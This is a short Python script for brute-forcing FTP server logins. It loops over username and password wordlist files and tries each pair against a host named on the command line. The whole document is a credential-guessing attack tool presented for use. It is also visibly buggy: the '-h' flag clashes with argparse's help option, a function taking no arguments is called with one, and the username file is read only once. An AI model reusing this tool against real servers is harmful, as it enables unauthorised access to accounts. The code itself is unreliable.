#Brute forcing the login credentials for an FTP server
#       Takes as payloads:
#       The user_dict and pass_dict file
#       Stored in the previous directory

import ftplib
import sys
import argparse
global host_name

def bruteftp(passwd, uname):
    try:
        target=host_name
        ftp=ftplib.FTP(target)
        password=passwd.strip('\r').strip('\n')
        print('Trying with: '+uname+" "+password)
        ftp.login(uname,password)
        ftp.quit()
        print('Login succeeded with: '+uname+" "+password)
        return(uname,passwd)
    except Exception as e:
        #print("Incorrect credentials.")
        return(None,None)

def driver_code():
    dict_file = open('../pass_dict.txt','r')
    user_file = open('../user_dict.txt','r')
    for line in dict_file.readlines():
        for uname in user_file.readlines():
                bruteftp(line, uname)

parser = argparse.ArgumentParser()
parser.add_argument('-h','--host-name', help='The host name')
#CMD Arg parsing done
args = vars(parser.parse_args())
host_name = args["host_name"]
driver_code(host_name)
